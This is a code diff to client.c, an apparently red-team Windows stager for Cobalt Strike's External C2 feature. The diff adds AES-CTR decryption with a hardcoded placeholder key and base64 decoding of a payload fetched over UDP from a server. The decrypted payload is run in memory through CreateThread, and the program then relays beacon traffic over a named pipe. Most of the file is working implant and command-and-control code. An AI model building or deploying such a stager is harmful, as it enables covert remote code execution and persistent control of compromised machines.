@@ -1,25 +1,24 @@
 /**
  * client.c
- * by Daniel Fitzgerald and Ian Roberts
  *
  * Program to provide UDP communications for Cobalt Strike using the External C2 feature.
  */
 
-#pragma once
 #define _CRT_SECURE_NO_WARNINGS
 #define _WINSOCK_DEPRECATED_NO_WARNINGS
 #pragma comment (lib, "Ws2_32.lib")
-
-#define FD_SETSIZE 1 //The default size of an FD set is 64 sockets, but we only need 1. Must be defined before including winsock2.h.
-#define INIT_SEQNUM 0 //Initial sequence number for the client's transmissions
-#define TIMEOUT_SEC  10 //number of seconds to wait before timeout. 
 
 #include <winsock2.h>
 #include <ws2tcpip.h>
 #include <stdio.h> 
 #include <stdlib.h>
 
+#include "aes.h"
+#include "base64.h"
+
+#define CBC 1
 #define MAX 4096
+#define IV_MAX_SIZE 16
 // Mudge used these values in his example
 #define PAYLOAD_MAX_SIZE 512 * 1024
 #define BUFFER_MAX_SIZE 1024 * 1024
@@ -39,6 +38,7 @@
 
 static DWORD server_seqnum = 0;
 static DWORD my_seqnum = 0;
+
 
 /**
  * Creates a socket connection in Windows
@@ -522,10 +522,10 @@ void write_frame(HANDLE my_handle, char * buffer, DWORD length) {
 
 
 /**
- * Main function. Connects to IRC server over TCP, gets beacon and spawns it, then enters send/recv loop
+ * Main function. Connects to server over UDP, gets beacon and spawns it, then enters send/recv loop
  *
  */
-void main(int argc, char* argv[])
+int main(int argc, char* argv[])
 //TODO - add argument for IPv4 vs IPv6. TCP allows for protocol-agnostic sockets, UDP does not. 
 {
 	// Set connection info
@@ -562,8 +562,9 @@ void main(int argc, char* argv[])
 	//RETRIES = atoi(argv[6]);
 	RETRIES = atoi("FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF");
 
-	DWORD payloadLen = 0;
-	char* payloadData = NULL;
+	char key[100] = "GGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGG"\
+					"GGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGG";
+
 	HANDLE beaconPipe = INVALID_HANDLE_VALUE;
 
 	int iResult = 0;
@@ -575,7 +576,7 @@ void main(int argc, char* argv[])
 	if (sockfd == INVALID_SOCKET)
 	{
 		debug_print("%s", "Socket creation error!\n");
-		exit(0);
+		return 0;
 	}
 	debug_print("%s", "Socket Created\n");
 
@@ -585,7 +586,7 @@ void main(int argc, char* argv[])
 	{
 		debug_print("%s", "threeWayHandshake returned error\n");
 		closesocket(sockfd);
-		exit(0);
+		return 0;
 	}
 	debug_print("%s", "Handshake completed.\n");
 
@@ -595,18 +596,77 @@ void main(int argc, char* argv[])
 	{
 		debug_print("%s", "payload buffer malloc failed!\n");
 		closesocket(sockfd);
-		exit(0);
+		return 0;
 	}
 
-	DWORD payload_size = recvData(sockfd, payload, PAYLOAD_MAX_SIZE, RETRIES);
-	if (payload_size < 0)
+	char * iv = (char *)calloc(IV_MAX_SIZE, sizeof(char));
+	if (iv == NULL)
+	{
+		debug_print("%s", "iv malloc failed!\n");
+		closesocket(sockfd);
+		free(payload);
+		return 0;
+	}
+	char * ct = (char *)calloc(BUFFER_MAX_SIZE, sizeof(char));
+	if (ct == NULL)
+	{
+		debug_print("%s", "ct malloc failed!\n");
+		closesocket(sockfd);
+		free(iv);
+		free(payload);
+		return 0;
+	}
+	char * b64iv = (char *)calloc(IV_MAX_SIZE*2, sizeof(char));
+	if (b64iv == NULL)
+	{
+		debug_print("%s", "b64ct malloc failed!\n");
+		closesocket(sockfd);
+		free(iv);
+		free(ct);
+		free(payload);
+		return 0;
+	}
+	char * b64ct = (char *)calloc(BUFFER_MAX_SIZE, sizeof(char));
+	if (b64ct == NULL)
+	{
+		debug_print("%s", "b64ct malloc failed!\n");
+		closesocket(sockfd);
+		free(iv);
+		free(ct);
+		free(b64iv);
+		free(payload);
+		return 0;
+	}
+
+	DWORD iv_size = recvData(sockfd, b64iv, IV_MAX_SIZE, RETRIES);
+	DWORD ct_size = recvData(sockfd, b64ct, PAYLOAD_MAX_SIZE, RETRIES);
+	if (ct_size < 0 || iv_size < 0)
 	{
 		debug_print("%s", "recvData error, exiting\n");
 		closesocket(sockfd);
+		free(iv);
+		free(ct);
+		free(b64iv);
+		free(b64ct);
 		free(payload);
-		exit(0);
+		return 0;
 	}
-	debug_print("Recv %d byte payload from TS\n", payload_size);
+
+	iv_size = Base64decode(iv, b64iv);
+	ct_size = Base64decode(ct, b64ct);
+
+	// Decrypt payload
+	struct AES_ctx ctx;
+	//AES_init_ctx(&ctx, key);
+	AES_init_ctx_iv(&ctx, (uint8_t *) key, (uint8_t *) iv);
+	AES_CTR_xcrypt_buffer(&ctx, (uint8_t *) ct, ct_size);
+
+	memcpy(payload, ct, ct_size);
+
+	free(iv);
+	free(ct);
+	free(b64iv);
+	free(b64ct);
 	/* inject the payload stage into the current process */
 	CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)payload, (LPVOID) NULL, 0, NULL);
 
@@ -621,7 +681,7 @@ void main(int argc, char* argv[])
 		// Pipe str (i.e. "mIRC")
 		strcat(pipestr, pipe_str);
 		// Full string (i.e. "\\\\.\\pipe\\mIRC")
-		beaconPipe = CreateFileA(pipestr, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, (DWORD)NULL, NULL);
+		beaconPipe = CreateFileA(pipestr, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
 	}
 	debug_print("%s", "Connected to pipe!!\n");
 
@@ -633,7 +693,7 @@ void main(int argc, char* argv[])
 		closesocket(sockfd);
 		CloseHandle(beaconPipe);
 		free(payload);
-		exit(0);
+		return 0;
 	}
 
 	while (1) {
@@ -676,6 +736,6 @@ void main(int argc, char* argv[])
 	closesocket(sockfd);
 	CloseHandle(beaconPipe);
 
-	exit(0);
+	return 0;
 }
 
